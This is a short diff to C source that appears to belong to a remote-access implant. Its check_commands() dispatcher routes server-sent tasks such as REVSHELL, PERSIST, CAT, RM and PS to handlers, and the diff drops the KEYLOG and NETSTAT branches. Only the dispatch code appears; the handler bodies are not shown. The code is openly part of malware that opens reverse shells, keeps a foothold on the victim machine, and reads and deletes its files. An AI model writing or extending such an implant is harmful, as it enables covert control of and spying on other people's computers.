@@ -132,8 +132,6 @@ void check_commands() {
             task_locate(id_task);
         } else if (strcmp(type, "REVSHELL") == 0) {
             task_revshell();
-        } else if (strcmp(type, "KEYLOG") == 0) {
-            task_keylog();
         } else if (strcmp(type, "PERSIST") == 0) {
             task_persist();
         } else if (strcmp(type, "CAT") == 0) {
@@ -144,8 +142,6 @@ void check_commands() {
             task_rm();
         } else if (strcmp(type, "PS") == 0) {
             task_ps();
-        } else if (strcmp(type, "NETSTAT") == 0) {
-            task_netstat();
         }
     }
     
